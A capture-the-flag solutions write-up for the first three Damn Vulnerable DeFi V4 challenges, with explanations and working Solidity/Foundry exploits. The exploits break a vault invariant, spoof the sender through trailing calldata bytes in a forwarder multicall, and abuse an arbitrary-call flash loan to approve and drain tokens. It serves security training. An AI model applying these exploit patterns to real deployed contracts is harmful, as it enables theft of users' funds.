# Damn Vulnerable DeFi V4 2025 Foundry Solutions by JohnnyTime

Solutions to [Damn Vulnerable DeFi V4](https://www.damnvulnerabledefi.xyz/) CTF challenges ⛳️
Original repository (without solutions): [Damn Vulnerable DeFi V4 Github](https://github.com/theredguild/damn-vulnerable-defi)

## 0.1 - What's New In Damn Vulnerable DeFi V4

[TBC]

- Foundry
- Improved Challenges
- New Challenges

## 0.2 - How to start: Complete Beginners Guide

[TBC]

## Challenge 1 - Unstoppable

The challenge is to halt the `UnstoppableVault` contract, which offers flash loans for free until a grace period ends. The goal is to stop the vault from offering flash loans by exploiting a vulnerability in the system.

### Vulnerability

The vulnerability lies in the `UnstoppableVault` contract's `flashLoan` function. Specifically, the function checks if the total assets in the vault match the total supply of shares before proceeding with the flash loan. If this condition is not met, the flash loan will fail.

### Exploitation

To exploit this vulnerability, you can transfer a small amount of the vault's token directly to the vault. This action will cause the vault's token balance to increase without minting new shares, thus breaking the invariant that the total assets should equal the total supply of shares. As a result, any subsequent flash loan attempts will fail, triggering the `UnstoppableMonitor` contract to pause the vault and transfer ownership back to the deployer.

### Code Exploitation

In the `UnstoppableChallenge` contract, the `test_unstoppable` function demonstrates this exploit:

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}
```

This function transfers 1 token to the vault, causing the flash loan invariant to break and halting the vault.

## Challenge 2 - Naive Receiver

The challenge involves a smart contract system with a flash loan pool (`NaiveReceiverPool`) and a flash loan receiver (`FlashLoanReceiver`). The pool has a fixed fee for flash loans and supports meta-transactions via a `BasicForwarder` contract. The goal is to drain all WETH from both the pool and the receiver and deposit it into a designated recovery account.

### Contracts Overview

1. **NaiveReceiverPool**: This contract offers flash loans with a fixed fee of 1 WETH. It supports meta-transactions via the `BasicForwarder` contract.
2. **FlashLoanReceiver**: This contract receives flash loans from the `NaiveReceiverPool` and is expected to repay the loan plus the fee.
3. **BasicForwarder**: This contract allows meta-transactions, enabling users to batch multiple calls into a single transaction.
4. **Multicall**: This contract allows multiple function calls to be executed in a single transaction.

### Vulnerability Breakdown

The vulnerability lies in the `NaiveReceiverPool` contract's `flashLoan` function. The function allows anyone to repeatedly call it, causing the `FlashLoanReceiver` to pay the fixed fee each time. This can be exploited to drain the receiver's balance by repeatedly initiating flash loans with zero amount, but still incurring the fixed fee.

### Exploit Implementation

1. **Repeated Flash Loans**: The attacker repeatedly calls the `flashLoan` function with zero amount, causing the `FlashLoanReceiver` to pay the fixed fee each time. This drains the receiver's balance which is transferred to the pool.
2. **Meta-Transaction Execution**: The attacker uses the `BasicForwarder` to execute a series of flash loan calls and a final withdrawal call in a single transaction. We exploit here the access control issue within the pool contract which blindly trusts the 20 last bytes of the message data to determine who is the sender of the call, by crafting a malicious message data we can make the pool believe that we are the deployer of the pool and access all it's deposited funds.

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {

    // Prepare call data for 10 flash loans and 1 withdrawal
    bytes[] memory callDatas = new bytes[](11);

    // Encode flash loan calls - on behalf of the Naive receiver
    for (uint i = 0; i < 10; i++) {
        callDatas[i] = abi.encodeCall(
        NaiveReceiverPool.flashLoan,
        (receiver, address(weth), 0, "0x")
        );
    }

    // Encode withdrawal call
    // Exploit the access control vulnerability by passing the request through the forwarder
    // And setting the deployer as sender in the last 20 bytes (That's how the pool parses it)
    callDatas[10] = abi.encodePacked(
        abi.encodeCall(
        NaiveReceiverPool.withdraw,
        (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
        ),
        bytes32(uint256(uint160(deployer)))
    );

    // Encode the multicall
    bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);

    // Create forwarder request
    BasicForwarder.Request memory request = BasicForwarder.Request(
        player,
        address(pool),
        0,
        gasleft(),
        forwarder.nonces(player),
        multicallData,
        1 days
    );

    // Hash the request
    bytes32 requestHash = keccak256(
        abi.encodePacked(
        "\x19\x01",
        forwarder.domainSeparator(),
        forwarder.getDataHash(request)
        )
    );

    // Sign the request
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
    bytes memory signature = abi.encodePacked(r, s, v);

    // Execute the request
    forwarder.execute(request, signature);
}
```

### Explanation of the Exploit

1. **Prepare Flash Loan Calls**: The exploit prepares 10 flash loan calls with zero amount, which will drain the receiver's balance by repeatedly incurring the fixed fee.
2. **Prepare Withdrawal Call**: The exploit prepares a final withdrawal call to transfer all WETH from the pool and the receiver to the recovery account. We set the deployer address as the last 20 bytes so the pool will think the deployer is the sender.
3. **Encode Multicall**: The exploit encodes the flash loan calls and the withdrawal call into a single multicall.
4. **Create Forwarder Request**: The exploit creates a forwarder request with the encoded multicall.
5. **Sign the Request**: The exploit signs the forwarder request using the player's private key.
6. **Execute the Request**: The exploit executes the forwarder request, draining the receiver's balance and transferring all WETH to the recovery account.

## Challenge 3 - Truster

The objective of this challenge is to drain all 1 million DVT tokens from the TrusterLenderPool and deposit them into the designated recovery account, all within a single transaction.

### Vulnerability Breakdown

The vulnerability lies in the `flashLoan` function of the `TrusterLenderPool` contract:

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    // @audit-issue This line allows the borrower to call any function on any contract, including the token contract itself.
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

The key issue is the `target.functionCall(data)` line, which allows the borrower to execute arbitrary code on any contract. This can be exploited to approve the transfer of tokens from the pool to an attacker-controlled address.

### Exploit Breakdown

The exploit is implemented in the newly created `TrusterExploit` contract (added to the test file):

```solidity
contract TrusterExploit {
    TrusterLenderPool public pool;
    DamnValuableToken public token;
    address public recovery;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
        // Prepare the calldata to approve this contract to spend the pool's tokens
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), _token.balanceOf(address(_pool)));

        // Execute the flash loan with the crafted calldata
        _pool.flashLoan(0, address(this), address(_token), data);

        // Transfer the approved tokens to the recovery account
        _token.transferFrom(address(_pool), _recovery, _token.balanceOf(address(_pool)));
    }
}
```

#### Step-by-Step Exploit

1. **Prepare the calldata**: The exploit contract prepares the calldata to call the `approve` function on the token contract, allowing the exploit contract to spend the pool's tokens.

   ```solidity
   bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), _token.balanceOf(address(_pool)));
   ```

2. **Execute the flash loan**: The exploit contract calls the `flashLoan` function with the crafted calldata. This causes the pool to call the `approve` function on the token contract, approving the exploit contract to spend the pool's tokens.

   ```solidity
   _pool.flashLoan(0, address(this), address(_token), data);
   ```

3. **Transfer the tokens**: The exploit contract then transfers all approved tokens from the pool to the recovery account.
   ```solidity
   _token.transferFrom(address(_pool), _recovery, _token.balanceOf(address(_pool)));
   ```

### Test Contract

All that is left todo is to deploy the exploit contract in the `TrusterChallenge` test section, since the exploit is triggered in the constructor of the exploit contract, it will be executed as soon as the contract is deployed.

```solidity
contract TrusterChallenge is Test {

    function test_truster() public checkSolvedByPlayer {
        // @audit-info our small addition is here :)
        new TrusterExploit(pool, token, recovery);
    }

}
```
